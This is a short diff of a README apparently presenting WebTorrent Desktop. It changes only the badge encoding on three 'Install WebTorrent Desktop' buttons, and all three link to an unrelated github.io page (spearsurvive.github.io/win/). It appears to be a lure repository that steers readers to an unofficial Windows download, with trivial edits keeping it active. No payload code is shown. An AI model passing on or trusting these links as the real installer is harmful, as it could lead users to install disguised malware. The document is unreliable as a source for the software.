@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install WebTorrent Desktop](https://img.shields.io/badge/⬇_Install_WebTorrent%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install WebTorrent Desktop](https://img.shields.io/badge/⬇_Install_WebTorrent+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ WebTorrent Desktop is a streaming torrent client that starts playing video and a
 
 <div align="center">
 
-[![⬇ Install WebTorrent Desktop](https://img.shields.io/badge/⬇_Install_WebTorrent%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install WebTorrent Desktop](https://img.shields.io/badge/⬇_Install_WebTorrent+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ WebTorrent Desktop is a streaming torrent client that starts playing video and a
 
 <div align="center">
 
-[![⬇ Install WebTorrent Desktop](https://img.shields.io/badge/⬇_Install_WebTorrent%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install WebTorrent Desktop](https://img.shields.io/badge/⬇_Install_WebTorrent+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
